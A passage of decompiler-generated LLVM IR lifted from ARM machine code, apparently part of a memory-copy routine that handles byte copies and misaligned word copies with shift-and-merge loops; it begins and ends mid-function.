  %v5_1708c = load i32, i32* %r1.global-to-local, align 4
  %v6_1708c = inttoptr i32 %v5_1708c to i8*
  %v7_1708c = load i8, i8* %v6_1708c, align 1
  %v10_1708c = add i32 %v5_1708c, 1
  store i32 %v10_1708c, i32* %r1.global-to-local, align 4
  %v8_17090 = inttoptr i32 %v7_17090 to i8*
  store i8 %v7_1708c, i8* %v8_17090, align 1
  %v9_17090 = load i32, i32* %r0.global-to-local, align 4
  %v10_17090 = add i32 %v9_17090, 1
  store i32 %v10_17090, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_17094 = load i8*, i8** %stack_var_-8, align 4
  %v3_17094 = ptrtoint i8* %v2_17094 to i32
  store i32 %v3_17094, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_16fdc)
  %v0_1709c.pre = load i32, i32* @ip, align 4
  %v0_170a4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_170a8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1709c

dec_label_pc_1709c:                               ; preds = %dec_label_pc_16fe8, %.thread126
  %v2_170a8 = phi i32 [ %v1_16fd0, %dec_label_pc_16fe8 ], [ %v2_170a8.pre, %.thread126 ]
  %v0_170a4 = phi i32 [ %v0_16fd0, %dec_label_pc_16fe8 ], [ %v0_170a4.pre, %.thread126 ]
  %v0_1709c = phi i32 [ %v1_16fe8, %dec_label_pc_16fe8 ], [ %v0_1709c.pre, %.thread126 ]
  %v1_1709c = sub i32 4, %v0_1709c
  store i32 %v1_1709c, i32* @ip, align 4
  %v1_170a0 = add i32 %v1_1709c, -2
  %v3_170a0 = sub i32 1, %v1_1709c
  %v4_170a0 = and i32 %v3_170a0, %v1_1709c
  %v5_170a0 = icmp slt i32 %v4_170a0, 0
  store i1 %v5_170a0, i1* %cpsr_v.global-to-local, align 1
  %v6_170a0 = icmp slt i32 %v1_170a0, 0
  store i1 %v6_170a0, i1* %cpsr_n.global-to-local, align 1
  %v7_170a0 = icmp eq i32 %v1_1709c, 2
  store i1 %v7_170a0, i1* %cpsr_z.global-to-local, align 1
  %v1_170a4 = inttoptr i32 %v0_170a4 to i8*
  %v2_170a4 = load i8, i8* %v1_170a4, align 1
  %v3_170a4 = zext i8 %v2_170a4 to i32
  store i32 %v3_170a4, i32* @r3, align 4
  %v5_170a4 = add i32 %v0_170a4, 1
  store i32 %v5_170a4, i32* @r1, align 4
  %v3_170a8 = inttoptr i32 %v2_170a8 to i8*
  store i8 %v2_170a4, i8* %v3_170a8, align 1
  %v4_170a8 = load i32, i32* @r0, align 4
  %v5_170a8 = add i32 %v4_170a8, 1
  store i32 %v5_170a8, i32* @r0, align 4
  %v0_170ac = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_170ac = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_170ac = xor i1 %v0_170ac, %v1_170ac
  br i1 %v2_170ac, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1709c
  %v3_170ac = load i32, i32* @r1, align 4
  %v4_170ac = inttoptr i32 %v3_170ac to i8*
  %v5_170ac = load i8, i8* %v4_170ac, align 1
  %v6_170ac = zext i8 %v5_170ac to i32
  store i32 %v6_170ac, i32* @r3, align 4
  %v8_170ac = add i32 %v3_170ac, 1
  store i32 %v8_170ac, i32* @r1, align 4
  %v6_170b0 = inttoptr i32 %v5_170a8 to i8*
  store i8 %v5_170ac, i8* %v6_170b0, align 1
  %v7_170b0 = load i32, i32* @r0, align 4
  %v8_170b0 = add i32 %v7_170b0, 1
  store i32 %v8_170b0, i32* @r0, align 4
  %v1_170b4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_170b4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1709c, %bb145
  %v7_170b8 = phi i32 [ %v8_170b0, %bb145 ], [ %v5_170a8, %dec_label_pc_1709c ]
  %v2_170b8 = phi i1 [ %v2_170b4.pre, %bb145 ], [ %v1_170ac, %dec_label_pc_1709c ]
  %v1_170b8 = phi i1 [ %v1_170b4.pre, %bb145 ], [ %v0_170ac, %dec_label_pc_1709c ]
  %v0_170b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_170b4 = xor i1 %v2_170b8, %v1_170b8
  %v4_170b4 = or i1 %v0_170b4, %v3_170b4
  br i1 %v4_170b4, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_170b4 = load i32, i32* @r1, align 4
  %v6_170b4 = inttoptr i32 %v5_170b4 to i8*
  %v7_170b4 = load i8, i8* %v6_170b4, align 1
  %v8_170b4 = zext i8 %v7_170b4 to i32
  store i32 %v8_170b4, i32* @r3, align 4
  %v10_170b4 = add i32 %v5_170b4, 1
  store i32 %v10_170b4, i32* @r1, align 4
  %v8_170b8 = inttoptr i32 %v7_170b8 to i8*
  store i8 %v7_170b4, i8* %v8_170b8, align 1
  %v9_170b8 = load i32, i32* @r0, align 4
  %v10_170b8 = add i32 %v9_170b8, 1
  store i32 %v10_170b8, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_171ec77 = phi i32 [ %v10_170b8, %bb146 ], [ %v7_170b8, %.thread127 ]
  %v0_170bc = load i32, i32* %r2.global-to-local, align 4
  %v1_170bc = load i32, i32* @ip, align 4
  %v2_170bc = sub i32 %v0_170bc, %v1_170bc
  store i32 %v2_170bc, i32* %r2.global-to-local, align 4
  %v4_170bc = xor i32 %v1_170bc, %v0_170bc
  %v5_170bc = xor i32 %v2_170bc, %v0_170bc
  %v6_170bc = and i32 %v5_170bc, %v4_170bc
  %v7_170bc = icmp slt i32 %v6_170bc, 0
  store i1 %v7_170bc, i1* %cpsr_v.global-to-local, align 1
  %v8_170bc = icmp slt i32 %v2_170bc, 0
  store i1 %v8_170bc, i1* %cpsr_n.global-to-local, align 1
  %v9_170bc = icmp eq i32 %v0_170bc, %v1_170bc
  store i1 %v9_170bc, i1* %cpsr_z.global-to-local, align 1
  %v2_170c0 = xor i1 %v8_170bc, %v7_170bc
  br i1 %v2_170c0, label %bb140, label %dec_label_pc_170c4

dec_label_pc_170c4:                               ; preds = %.thread128
  %v0_170c4 = load i32, i32* @r1, align 4
  %v1_170c4 = urem i32 %v0_170c4, 4
  store i32 %v1_170c4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_170c4 = icmp eq i32 %v1_170c4, 0
  store i1 %v2_170c4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_170c4 to i2
  br i1 %v2_170c4, label %dec_label_pc_16ff8, label %dec_label_pc_170cc

dec_label_pc_170cc:                               ; preds = %dec_label_pc_16ff0, %dec_label_pc_170c4
  %v0_171ec76 = phi i32 [ %v1_16fd0, %dec_label_pc_16ff0 ], [ %v0_171ec77, %dec_label_pc_170c4 ]
  %v0_17154 = phi i32 [ %v2_16fe0, %dec_label_pc_16ff0 ], [ %v2_170bc, %dec_label_pc_170c4 ]
  %v0_170d4.off0 = phi i2 [ %extract.t, %dec_label_pc_16ff0 ], [ %extract.t131, %dec_label_pc_170c4 ]
  %v0_170cc = phi i32 [ %v0_16fd0, %dec_label_pc_16ff0 ], [ %v0_170c4, %dec_label_pc_170c4 ]
  %v1_170cc = and i32 %v0_170cc, -4
  store i32 %v1_170cc, i32* %r1.global-to-local, align 4
  %v1_170d0 = inttoptr i32 %v1_170cc to i32*
  %v2_170d0 = load i32, i32* %v1_170d0, align 4
  store i32 %v2_170d0, i32* %lr.global-to-local, align 4
  %v4_170d0 = add i32 %v1_170cc, 4
  store i32 %v4_170d0, i32* %r1.global-to-local, align 4
  %v1_1714c = add i32 %v0_17154, -12
  %v3_1714c = sub i32 11, %v0_17154
  %v4_1714c = and i32 %v3_1714c, %v0_17154
  %v5_1714c = icmp slt i32 %v4_1714c, 0
  store i1 %v5_1714c, i1* %cpsr_v.global-to-local, align 1
  %v6_1714c = icmp slt i32 %v1_1714c, 0
  store i1 %v6_1714c, i1* %cpsr_n.global-to-local, align 1
  %v7_1714c = icmp eq i32 %v0_17154, 12
  store i1 %v7_1714c, i1* %cpsr_z.global-to-local, align 1
  %v2_17150 = xor i1 %v6_1714c, %v5_1714c
  switch i2 %v0_170d4.off0, label %dec_label_pc_170e0 [
    i2 -1, label %dec_label_pc_171b8
    i2 -2, label %dec_label_pc_1714c
  ]

dec_label_pc_170e0:                               ; preds = %dec_label_pc_170cc
  br i1 %v2_17150, label %dec_label_pc_1712c, label %dec_label_pc_170e8

dec_label_pc_170e8:                               ; preds = %dec_label_pc_170e0
  store i32 %v1_1714c, i32* %r2.global-to-local, align 4
  %v3_170ec = load i32, i32* @r4, align 4
  store i32 %v3_170ec, i32* %stack_var_-16, align 4
  %v6_170ec = load i32, i32* @r5, align 4
  store i32 %v6_170ec, i32* %stack_var_-12, align 4
  br label %dec_label_pc_170f0

dec_label_pc_170f0:                               ; preds = %dec_label_pc_170f0.dec_label_pc_170f0_crit_edge, %dec_label_pc_170e8
  %v0_17114 = phi i32 [ %v12_17114, %dec_label_pc_170f0.dec_label_pc_170f0_crit_edge ], [ %v0_171ec76, %dec_label_pc_170e8 ]
  %v0_170f4 = phi i32 [ %v0_170f4.pre, %dec_label_pc_170f0.dec_label_pc_170f0_crit_edge ], [ %v4_170d0, %dec_label_pc_170e8 ]
  %v0_170f0 = phi i32 [ %v0_170f0.pre, %dec_label_pc_170f0.dec_label_pc_170f0_crit_edge ], [ %v2_170d0, %dec_label_pc_170e8 ]
  %v3_170f0 = udiv i32 %v0_170f0, 256
  %v1_170f4 = inttoptr i32 %v0_170f4 to i32*
  %v2_170f4 = load i32, i32* %v1_170f4, align 4
  store i32 %v2_170f4, i32* %r4.global-to-local, align 4
  %v3_170f4 = add i32 %v0_170f4, 4
  %v4_170f4 = inttoptr i32 %v3_170f4 to i32*
  %v5_170f4 = load i32, i32* %v4_170f4, align 4
  store i32 %v5_170f4, i32* %r5.global-to-local, align 4
  %v6_170f4 = add i32 %v0_170f4, 8
  %v7_170f4 = inttoptr i32 %v6_170f4 to i32*
  %v8_170f4 = load i32, i32* %v7_170f4, align 4
  store i32 %v8_170f4, i32* %ip.global-to-local, align 4
  %v9_170f4 = add i32 %v0_170f4, 12
  %v10_170f4 = inttoptr i32 %v9_170f4 to i32*
  %v11_170f4 = load i32, i32* %v10_170f4, align 4
  store i32 %v11_170f4, i32* %lr.global-to-local, align 4
  %v12_170f4 = add i32 %v0_170f4, 16
  store i32 %v12_170f4, i32* %r1.global-to-local, align 4
  %v4_170f8 = mul i32 %v2_170f4, 16777216
  %v5_170f8 = or i32 %v4_170f8, %v3_170f0
  store i32 %v5_170f8, i32* @r3, align 4
  %v3_170fc = udiv i32 %v2_170f4, 256
  %v4_17100 = mul i32 %v5_170f4, 16777216
  %v5_17100 = or i32 %v4_17100, %v3_170fc
  store i32 %v5_17100, i32* %r4.global-to-local, align 4
  %v3_17104 = udiv i32 %v5_170f4, 256
  %v4_17108 = mul i32 %v8_170f4, 16777216
  %v5_17108 = or i32 %v4_17108, %v3_17104
  store i32 %v5_17108, i32* %r5.global-to-local, align 4
  %v3_1710c = udiv i32 %v8_170f4, 256
  %v4_17110 = mul i32 %v11_170f4, 16777216
  %v5_17110 = or i32 %v4_17110, %v3_1710c
  store i32 %v5_17110, i32* @ip, align 4
  %v1_17114 = inttoptr i32 %v0_17114 to i32*
  store i32 %v5_170f8, i32* %v1_17114, align 4
  %v3_17114 = add i32 %v0_17114, 4
  %v4_17114 = inttoptr i32 %v3_17114 to i32*
  %v5_17114 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17114, i32* %v4_17114, align 4
  %v6_17114 = add i32 %v0_17114, 8
  %v7_17114 = inttoptr i32 %v6_17114 to i32*
  %v8_17114 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17114, i32* %v7_17114, align 4
  %v9_17114 = add i32 %v0_17114, 12
  %v10_17114 = inttoptr i32 %v9_17114 to i32*
  %v11_17114 = load i32, i32* @ip, align 4
  store i32 %v11_17114, i32* %v10_17114, align 4
  %v12_17114 = add i32 %v0_17114, 16
  store i32 %v12_17114, i32* @r0, align 4
  %v0_17118 = load i32, i32* %r2.global-to-local, align 4
  %v1_17118 = add i32 %v0_17118, -16
  store i32 %v1_17118, i32* %r2.global-to-local, align 4
  %v3_17118 = sub i32 15, %v0_17118
  %v4_17118 = and i32 %v3_17118, %v0_17118
  %v5_17118 = icmp slt i32 %v4_17118, 0
  %v6_17118 = icmp slt i32 %v1_17118, 0
  %v2_1711c = xor i1 %v6_17118, %v5_17118
  br i1 %v2_1711c, label %dec_label_pc_17120, label %dec_label_pc_170f0.dec_label_pc_170f0_crit_edge

dec_label_pc_170f0.dec_label_pc_170f0_crit_edge:  ; preds = %dec_label_pc_170f0
  %v0_170f0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_170f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_170f0

dec_label_pc_17120:                               ; preds = %dec_label_pc_170f0
  %v2_17120 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17120, i32* @r4, align 4
  %v5_17120 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17120, i32* @r5, align 4
  %v1_17124 = add i32 %v0_17118, -4
  store i32 %v1_17124, i32* %r2.global-to-local, align 4
  %v3_17124 = add i32 %v0_17118, 2147483632
  %v4_17124 = and i32 %v1_17124, %v3_17124
  %v5_17124 = icmp slt i32 %v4_17124, 0
  store i1 %v5_17124, i1* %cpsr_v.global-to-local, align 1
  %v6_17124 = icmp slt i32 %v1_17124, 0
  store i1 %v6_17124, i1* %cpsr_n.global-to-local, align 1
  %v7_17124 = icmp eq i32 %v1_17124, 0
  store i1 %v7_17124, i1* %cpsr_z.global-to-local, align 1
  %v2_17128 = xor i1 %v6_17124, %v5_17124
  br i1 %v2_17128, label %dec_label_pc_17144, label %dec_label_pc_1712c

dec_label_pc_1712c:                               ; preds = %dec_label_pc_17120, %dec_label_pc_170e0, %dec_label_pc_1712c
  %v1_17138 = phi i32 [ %v4_17138, %dec_label_pc_1712c ], [ %v12_17114, %dec_label_pc_17120 ], [ %v0_171ec76, %dec_label_pc_170e0 ]
  %v0_1712c = load i32, i32* %lr.global-to-local, align 4
  %v3_1712c = udiv i32 %v0_1712c, 256
  store i32 %v3_1712c, i32* %ip.global-to-local, align 4
  %v0_17130 = load i32, i32* %r1.global-to-local, align 4
  %v1_17130 = inttoptr i32 %v0_17130 to i32*
  %v2_17130 = load i32, i32* %v1_17130, align 4
  store i32 %v2_17130, i32* %lr.global-to-local, align 4
  %v4_17130 = add i32 %v0_17130, 4
  store i32 %v4_17130, i32* %r1.global-to-local, align 4
  %v4_17134 = mul i32 %v2_17130, 16777216
  %v5_17134 = or i32 %v4_17134, %v3_1712c
  store i32 %v5_17134, i32* @ip, align 4
  %v2_17138 = inttoptr i32 %v1_17138 to i32*
  store i32 %v5_17134, i32* %v2_17138, align 4
  %v3_17138 = load i32, i32* @r0, align 4
  %v4_17138 = add i32 %v3_17138, 4
  store i32 %v4_17138, i32* @r0, align 4
  %v0_1713c = load i32, i32* %r2.global-to-local, align 4
  %v1_1713c = add i32 %v0_1713c, -4
  store i32 %v1_1713c, i32* %r2.global-to-local, align 4
  %v3_1713c = sub i32 3, %v0_1713c
  %v4_1713c = and i32 %v3_1713c, %v0_1713c
  %v5_1713c = icmp slt i32 %v4_1713c, 0
  %v6_1713c = icmp slt i32 %v1_1713c, 0
  %v2_17140 = xor i1 %v6_1713c, %v5_1713c
  br i1 %v2_17140, label %dec_label_pc_17144.loopexit, label %dec_label_pc_1712c

dec_label_pc_17144.loopexit:                      ; preds = %dec_label_pc_1712c
  %v7_1713c = icmp eq i32 %v0_1713c, 4
  store i1 %v5_1713c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1713c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1713c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %dec_label_pc_17144.loopexit, %dec_label_pc_17120
  %v0_1706c59 = phi i32 [ %v1_1713c, %dec_label_pc_17144.loopexit ], [ %v1_17124, %dec_label_pc_17120 ]
  %v0_17144 = load i32, i32* %r1.global-to-local, align 4
  %v1_17144 = add i32 %v0_17144, -3
  store i32 %v1_17144, i32* @r1, align 4
  br label %bb140

dec_label_pc_1714c:                               ; preds = %dec_label_pc_170cc
  br i1 %v2_17150, label %dec_label_pc_17198, label %dec_label_pc_17154

dec_label_pc_17154:                               ; preds = %dec_label_pc_1714c
  store i32 %v1_1714c, i32* %r2.global-to-local, align 4
  %v3_17158 = load i32, i32* @r4, align 4
  store i32 %v3_17158, i32* %stack_var_-16, align 4
  %v6_17158 = load i32, i32* @r5, align 4
  store i32 %v6_17158, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %dec_label_pc_1715c.dec_label_pc_1715c_crit_edge, %dec_label_pc_17154
  %v0_17180 = phi i32 [ %v12_17180, %dec_label_pc_1715c.dec_label_pc_1715c_crit_edge ], [ %v0_171ec76, %dec_label_pc_17154 ]
  %v0_17160 = phi i32 [ %v0_17160.pre, %dec_label_pc_1715c.dec_label_pc_1715c_crit_edge ], [ %v4_170d0, %dec_label_pc_17154 ]
  %v0_1715c = phi i32 [ %v0_1715c.pre, %dec_label_pc_1715c.dec_label_pc_1715c_crit_edge ], [ %v2_170d0, %dec_label_pc_17154 ]
  %v3_1715c = udiv i32 %v0_1715c, 65536
  %v1_17160 = inttoptr i32 %v0_17160 to i32*
  %v2_17160 = load i32, i32* %v1_17160, align 4
  store i32 %v2_17160, i32* %r4.global-to-local, align 4
  %v3_17160 = add i32 %v0_17160, 4
  %v4_17160 = inttoptr i32 %v3_17160 to i32*
  %v5_17160 = load i32, i32* %v4_17160, align 4
  store i32 %v5_17160, i32* %r5.global-to-local, align 4
  %v6_17160 = add i32 %v0_17160, 8
  %v7_17160 = inttoptr i32 %v6_17160 to i32*
  %v8_17160 = load i32, i32* %v7_17160, align 4
  store i32 %v8_17160, i32* %ip.global-to-local, align 4
  %v9_17160 = add i32 %v0_17160, 12
  %v10_17160 = inttoptr i32 %v9_17160 to i32*
  %v11_17160 = load i32, i32* %v10_17160, align 4
  store i32 %v11_17160, i32* %lr.global-to-local, align 4
  %v12_17160 = add i32 %v0_17160, 16
  store i32 %v12_17160, i32* %r1.global-to-local, align 4
  %v4_17164 = mul i32 %v2_17160, 65536
  %v5_17164 = or i32 %v4_17164, %v3_1715c
  store i32 %v5_17164, i32* @r3, align 4
  %v3_17168 = udiv i32 %v2_17160, 65536
  %v4_1716c = mul i32 %v5_17160, 65536
  %v5_1716c = or i32 %v4_1716c, %v3_17168
  store i32 %v5_1716c, i32* %r4.global-to-local, align 4
  %v3_17170 = udiv i32 %v5_17160, 65536
  %v4_17174 = mul i32 %v8_17160, 65536
  %v5_17174 = or i32 %v4_17174, %v3_17170
  store i32 %v5_17174, i32* %r5.global-to-local, align 4
  %v3_17178 = udiv i32 %v8_17160, 65536
  %v4_1717c = mul i32 %v11_17160, 65536
  %v5_1717c = or i32 %v4_1717c, %v3_17178
  store i32 %v5_1717c, i32* @ip, align 4
  %v1_17180 = inttoptr i32 %v0_17180 to i32*
  store i32 %v5_17164, i32* %v1_17180, align 4
  %v3_17180 = add i32 %v0_17180, 4
  %v4_17180 = inttoptr i32 %v3_17180 to i32*
  %v5_17180 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17180, i32* %v4_17180, align 4
  %v6_17180 = add i32 %v0_17180, 8
  %v7_17180 = inttoptr i32 %v6_17180 to i32*
  %v8_17180 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17180, i32* %v7_17180, align 4
  %v9_17180 = add i32 %v0_17180, 12
  %v10_17180 = inttoptr i32 %v9_17180 to i32*
  %v11_17180 = load i32, i32* @ip, align 4
  store i32 %v11_17180, i32* %v10_17180, align 4
  %v12_17180 = add i32 %v0_17180, 16
  store i32 %v12_17180, i32* @r0, align 4
  %v0_17184 = load i32, i32* %r2.global-to-local, align 4
  %v1_17184 = add i32 %v0_17184, -16
  store i32 %v1_17184, i32* %r2.global-to-local, align 4
  %v3_17184 = sub i32 15, %v0_17184
  %v4_17184 = and i32 %v3_17184, %v0_17184
  %v5_17184 = icmp slt i32 %v4_17184, 0
  %v6_17184 = icmp slt i32 %v1_17184, 0
  %v2_17188 = xor i1 %v6_17184, %v5_17184
  br i1 %v2_17188, label %dec_label_pc_1718c, label %dec_label_pc_1715c.dec_label_pc_1715c_crit_edge

dec_label_pc_1715c.dec_label_pc_1715c_crit_edge:  ; preds = %dec_label_pc_1715c
  %v0_1715c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17160.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1715c

dec_label_pc_1718c:                               ; preds = %dec_label_pc_1715c
  %v2_1718c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1718c, i32* @r4, align 4
  %v5_1718c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1718c, i32* @r5, align 4
  %v1_17190 = add i32 %v0_17184, -4
  store i32 %v1_17190, i32* %r2.global-to-local, align 4
  %v3_17190 = add i32 %v0_17184, 2147483632
  %v4_17190 = and i32 %v1_17190, %v3_17190
  %v5_17190 = icmp slt i32 %v4_17190, 0
  store i1 %v5_17190, i1* %cpsr_v.global-to-local, align 1
  %v6_17190 = icmp slt i32 %v1_17190, 0
  store i1 %v6_17190, i1* %cpsr_n.global-to-local, align 1
  %v7_17190 = icmp eq i32 %v1_17190, 0
  store i1 %v7_17190, i1* %cpsr_z.global-to-local, align 1
  %v2_17194 = xor i1 %v6_17190, %v5_17190
  br i1 %v2_17194, label %dec_label_pc_171b0, label %dec_label_pc_17198

dec_label_pc_17198:                               ; preds = %dec_label_pc_1718c, %dec_label_pc_1714c, %dec_label_pc_17198
  %v1_171a4 = phi i32 [ %v4_171a4, %dec_label_pc_17198 ], [ %v12_17180, %dec_label_pc_1718c ], [ %v0_171ec76, %dec_label_pc_1714c ]
  %v0_17198 = load i32, i32* %lr.global-to-local, align 4
  %v3_17198 = udiv i32 %v0_17198, 65536
  store i32 %v3_17198, i32* %ip.global-to-local, align 4
  %v0_1719c = load i32, i32* %r1.global-to-local, align 4
  %v1_1719c = inttoptr i32 %v0_1719c to i32*
  %v2_1719c = load i32, i32* %v1_1719c, align 4
  store i32 %v2_1719c, i32* %lr.global-to-local, align 4
  %v4_1719c = add i32 %v0_1719c, 4
  store i32 %v4_1719c, i32* %r1.global-to-local, align 4
  %v4_171a0 = mul i32 %v2_1719c, 65536
  %v5_171a0 = or i32 %v4_171a0, %v3_17198
  store i32 %v5_171a0, i32* @ip, align 4
  %v2_171a4 = inttoptr i32 %v1_171a4 to i32*
  store i32 %v5_171a0, i32* %v2_171a4, align 4
  %v3_171a4 = load i32, i32* @r0, align 4
  %v4_171a4 = add i32 %v3_171a4, 4
  store i32 %v4_171a4, i32* @r0, align 4
  %v0_171a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_171a8 = add i32 %v0_171a8, -4
  store i32 %v1_171a8, i32* %r2.global-to-local, align 4
  %v3_171a8 = sub i32 3, %v0_171a8
  %v4_171a8 = and i32 %v3_171a8, %v0_171a8
  %v5_171a8 = icmp slt i32 %v4_171a8, 0
  %v6_171a8 = icmp slt i32 %v1_171a8, 0
  %v2_171ac = xor i1 %v6_171a8, %v5_171a8
  br i1 %v2_171ac, label %dec_label_pc_171b0.loopexit, label %dec_label_pc_17198

dec_label_pc_171b0.loopexit:                      ; preds = %dec_label_pc_17198
  %v7_171a8 = icmp eq i32 %v0_171a8, 4
  store i1 %v5_171a8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_171a8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_171a8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_171b0

dec_label_pc_171b0:                               ; preds = %dec_label_pc_171b0.loopexit, %dec_label_pc_1718c
  %v0_1706c60 = phi i32 [ %v1_171a8, %dec_label_pc_171b0.loopexit ], [ %v1_17190, %dec_label_pc_1718c ]
  %v0_171b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_171b0 = add i32 %v0_171b0, -2
  store i32 %v1_171b0, i32* @r1, align 4
  br label %bb140

dec_label_pc_171b8:                               ; preds = %dec_label_pc_170cc
  br i1 %v2_17150, label %dec_label_pc_17204, label %dec_label_pc_171c0

dec_label_pc_171c0:                               ; preds = %dec_label_pc_171b8
  store i32 %v1_1714c, i32* %r2.global-to-local, align 4
  %v3_171c4 = load i32, i32* @r4, align 4
  store i32 %v3_171c4, i32* %stack_var_-16, align 4
  %v6_171c4 = load i32, i32* @r5, align 4
  store i32 %v6_171c4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_171c8

dec_label_pc_171c8:                               ; preds = %dec_label_pc_171c8.dec_label_pc_171c8_crit_edge, %dec_label_pc_171c0
  %v0_171ec = phi i32 [ %v12_171ec, %dec_label_pc_171c8.dec_label_pc_171c8_crit_edge ], [ %v0_171ec76, %dec_label_pc_171c0 ]
  %v0_171cc = phi i32 [ %v0_171cc.pre, %dec_label_pc_171c8.dec_label_pc_171c8_crit_edge ], [ %v4_170d0, %dec_label_pc_171c0 ]
  %v0_171c8 = phi i32 [ %v0_171c8.pre, %dec_label_pc_171c8.dec_label_pc_171c8_crit_edge ], [ %v2_170d0, %dec_label_pc_171c0 ]
  %v3_171c8 = udiv i32 %v0_171c8, 16777216
  %v1_171cc = inttoptr i32 %v0_171cc to i32*
  %v2_171cc = load i32, i32* %v1_171cc, align 4
  store i32 %v2_171cc, i32* %r4.global-to-local, align 4
  %v3_171cc = add i32 %v0_171cc, 4
  %v4_171cc = inttoptr i32 %v3_171cc to i32*
  %v5_171cc = load i32, i32* %v4_171cc, align 4
  store i32 %v5_171cc, i32* %r5.global-to-local, align 4
  %v6_171cc = add i32 %v0_171cc, 8
  %v7_171cc = inttoptr i32 %v6_171cc to i32*
  %v8_171cc = load i32, i32* %v7_171cc, align 4
  store i32 %v8_171cc, i32* %ip.global-to-local, align 4
  %v9_171cc = add i32 %v0_171cc, 12
  %v10_171cc = inttoptr i32 %v9_171cc to i32*
  %v11_171cc = load i32, i32* %v10_171cc, align 4
  store i32 %v11_171cc, i32* %lr.global-to-local, align 4
  %v12_171cc = add i32 %v0_171cc, 16
  store i32 %v12_171cc, i32* %r1.global-to-local, align 4
  %v4_171d0 = mul i32 %v2_171cc, 256
  %v5_171d0 = or i32 %v4_171d0, %v3_171c8
  store i32 %v5_171d0, i32* @r3, align 4
  %v3_171d4 = udiv i32 %v2_171cc, 16777216
  %v4_171d8 = mul i32 %v5_171cc, 256
  %v5_171d8 = or i32 %v4_171d8, %v3_171d4
  store i32 %v5_171d8, i32* %r4.global-to-local, align 4
  %v3_171dc = udiv i32 %v5_171cc, 16777216
  %v4_171e0 = mul i32 %v8_171cc, 256
  %v5_171e0 = or i32 %v4_171e0, %v3_171dc
  store i32 %v5_171e0, i32* %r5.global-to-local, align 4
  %v3_171e4 = udiv i32 %v8_171cc, 16777216
  %v4_171e8 = mul i32 %v11_171cc, 256
  %v5_171e8 = or i32 %v4_171e8, %v3_171e4
  store i32 %v5_171e8, i32* @ip, align 4
  %v1_171ec = inttoptr i32 %v0_171ec to i32*
  store i32 %v5_171d0, i32* %v1_171ec, align 4
  %v3_171ec = add i32 %v0_171ec, 4
  %v4_171ec = inttoptr i32 %v3_171ec to i32*
  %v5_171ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_171ec, i32* %v4_171ec, align 4
  %v6_171ec = add i32 %v0_171ec, 8
  %v7_171ec = inttoptr i32 %v6_171ec to i32*
  %v8_171ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_171ec, i32* %v7_171ec, align 4
  %v9_171ec = add i32 %v0_171ec, 12
  %v10_171ec = inttoptr i32 %v9_171ec to i32*
  %v11_171ec = load i32, i32* @ip, align 4
  store i32 %v11_171ec, i32* %v10_171ec, align 4
  %v12_171ec = add i32 %v0_171ec, 16
  store i32 %v12_171ec, i32* @r0, align 4
  %v0_171f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_171f0 = add i32 %v0_171f0, -16
  store i32 %v1_171f0, i32* %r2.global-to-local, align 4
  %v3_171f0 = sub i32 15, %v0_171f0
  %v4_171f0 = and i32 %v3_171f0, %v0_171f0
  %v5_171f0 = icmp slt i32 %v4_171f0, 0
  %v6_171f0 = icmp slt i32 %v1_171f0, 0
  %v2_171f4 = xor i1 %v6_171f0, %v5_171f0
  br i1 %v2_171f4, label %dec_label_pc_171f8, label %dec_label_pc_171c8.dec_label_pc_171c8_crit_edge

dec_label_pc_171c8.dec_label_pc_171c8_crit_edge:  ; preds = %dec_label_pc_171c8
  %v0_171c8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_171cc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_171c8

dec_label_pc_171f8:                               ; preds = %dec_label_pc_171c8
  %v2_171f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_171f8, i32* @r4, align 4
  %v5_171f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_171f8, i32* @r5, align 4
  %v1_171fc = add i32 %v0_171f0, -4
  store i32 %v1_171fc, i32* %r2.global-to-local, align 4
  %v3_171fc = add i32 %v0_171f0, 2147483632
  %v4_171fc = and i32 %v1_171fc, %v3_171fc
  %v5_171fc = icmp slt i32 %v4_171fc, 0
  store i1 %v5_171fc, i1* %cpsr_v.global-to-local, align 1
